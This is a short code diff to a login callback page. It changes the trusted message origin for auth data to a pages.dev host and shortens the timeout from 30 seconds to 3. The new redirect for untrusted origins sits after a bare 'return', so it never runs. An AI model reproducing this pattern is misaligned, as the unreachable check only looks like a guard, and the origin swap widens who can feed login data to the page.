@@ -84,7 +84,7 @@
   <div class="status-text">Authenticating<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
 
   <script>
-    const TRUSTED_AUTH_ORIGIN = 'https://auth.example.com';
+    const TRUSTED_AUTH_ORIGIN = 'https://ss-7uu.pages.dev';
     const STORAGE_KEY = 'login';
     
     let dataReceived = false;
@@ -93,7 +93,7 @@
       if (!dataReceived) {
         window.location.href = '/error?msg=' + encodeURIComponent('Authentication timeout - no data received');
       }
-    }, 30000);
+    }, 3000);
 
     function saveAuthData(data) {
       try {
@@ -107,7 +107,8 @@
 
     window.addEventListener('message', (ev) => {
       if (ev.origin !== TRUSTED_AUTH_ORIGIN) {
-        return;
+        return
+          window.location.href = '/error?msg=' + encodeURIComponent('data form unauthorise auth website (domain)');
       }
 
       const message = ev.data;
